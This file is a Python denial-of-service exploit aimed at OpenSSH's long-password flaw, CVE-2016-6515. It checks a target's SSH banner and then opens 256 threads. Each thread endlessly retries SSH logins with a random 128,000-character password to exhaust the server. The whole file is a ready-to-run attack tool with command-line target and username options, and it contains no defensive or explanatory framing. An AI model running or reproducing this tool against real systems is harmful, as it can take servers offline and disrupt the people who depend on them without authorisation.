import argparse
from log_colors import *
import random
import socket
import paramiko
import string
import sys
import threading

class SSHLoginThread(threading.Thread):
    def __init__(self, tid, host, username):
        threading.Thread.__init__(self)
        self.tid = tid
        self.host = host
        self.username = username
        psswd_len = 128000
        self.password = "".join(random.choice(string.ascii_lowercase) for i in range(psswd_len))
    
    # ssh login
    def run(self):
        while True:
            print (LogColors.BLUE + str(self.tid) + "->" + self.username + ":" + self.password + "..." + LogColors.ENDC)
            try:
                # connect via ssh
                ssh = paramiko.SSHClient()
                ssh.load_system_host_keys()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.host, 22, username = self.username, password = self.password)
            except Exception as e:
                print (LogColors.RED + "error connecting {}".format(self.host) + LogColors.ENDC)
                print (LogColors.RED + "error: " + str(e) + LogColors.ENDC)

class CVE2016_6515:
    
    # set crafted password by length
    def __init__(self, host, username):
        self.host = host
        self.username = username

    def check_ssh(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((self.host, 22))
            sock.send('WhoAreYou\r\n'.encode("utf-8"))
            result = sock.recv(100).decode("utf-8")
            sock.close()
            print (LogColors.YELLOW + result + LogColors.ENDC)
            if "OpenSSH" in result:
                print (LogColors.GREEN + "host may be vulnerable :)" + LogColors.ENDC)
                return True
            else:
                print (LogColors.RED + "not openssh :(" + LogColors.ENDC)
                return False
        except Exception as e:
            print (LogColors.RED + 'cannot connect to 22 port' + LogColors.ENDC)
            print (LogColors.RED + str(e) + LogColors.ENDC)
        return False
    
    # exploiting
    def check_dos(self):
        threadLock = threading.Lock()
        threads = [SSHLoginThread(j, self.host, self.username) for j in range(0, 256)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        print (LogColors.GREEN + "DoS successfully checked :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target host with openssh")
    parser.add_argument('-u','--username', required = True, help = "ssh username")
    args = vars(parser.parse_args())
    host, username = args['target'], args['username']
    cve = CVE2016_6515(host, username)
    if cve.check_ssh():
        cve.check_dos()

